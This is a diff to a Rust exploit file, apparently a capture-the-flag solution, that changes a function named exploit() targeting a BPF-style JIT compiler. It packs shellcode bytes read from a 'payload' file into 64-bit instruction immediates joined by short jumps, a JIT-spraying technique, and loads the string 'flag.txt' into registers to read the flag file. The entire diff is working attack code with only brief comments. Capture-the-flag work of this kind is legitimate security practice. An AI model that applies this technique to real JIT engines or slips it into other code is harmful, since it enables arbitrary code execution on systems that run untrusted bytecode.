@@ -1035,8 +1035,19 @@ fn add_immediate(space: &mut Vec<BpfInstT>, value: u64) {
     space.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
 }
 
+fn add_immediate_rbx(space: &mut Vec<BpfInstT>, value: u64) {
+    // make sure that this will be 8 bytes
+    assert!(!is_uimm32!(value));
+    space.push(BpfInstT { opc: 0x18, regs: 6, off: 0, imm: value as u32 as i32 });
+    space.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
+}
+
 fn exploit() {
     let mut instructions = vec![];
+
+    // store "flag.txt" into rax
+    add_immediate(&mut instructions, u64::from_le_bytes(*b"flag.txt"));
+    add_immediate_rbx(&mut instructions, u64::from_le_bytes(*b"\01234567")); // zero termination
 
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 10*2 + 4 + 1*2, imm: 0 });
     // just to be sure that the instruction above doesn't shrink:
@@ -1054,10 +1065,35 @@ fn exploit() {
     // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
     instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
 
-    // cc causes SIGTRAP
-    add_immediate(&mut instructions, 0xb7b6ccb4b3b2b1b0);
-    for _ in 0..10 {
-        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
+    let payload_sizes = [4, 5, 3, 5, 2+3, 3, 5, 3+2, 5, 3+2];
+    let payload = std::fs::read("payload").unwrap();
+    let mut payload_written = 0;
+
+    // cc causes SIGTRAP for debugger
+    // add_immediate(&mut instructions, 0x02ebcc_00_00000000);
+    add_immediate(&mut instructions, 0x02eb90_00_00000000);
+    for i in 0..10 {
+        if i >= payload_sizes.len() {
+            add_immediate(&mut instructions, u64::from_be(0xb83c0000000f0500)); // same as EPILOGUE
+        } else {
+            let size = payload_sizes[i];
+            let mut immediate = 0u64;
+            for b_index in 0..6 {
+                let byte = if b_index < size {
+                    let byte = payload[payload_written];
+                    payload_written += 1;
+                    byte
+                } else {
+                    0x90 // NOP
+                };
+                immediate |= byte as u64;
+                immediate <<= 8;
+            }
+            immediate |= 0xeb; // JMP
+            immediate <<= 8;
+            immediate |= 2; // offset (added to EIP = start of next instruction)
+            add_immediate(&mut instructions, u64::from_be(immediate));
+        }
     }
 
     let n = 9;
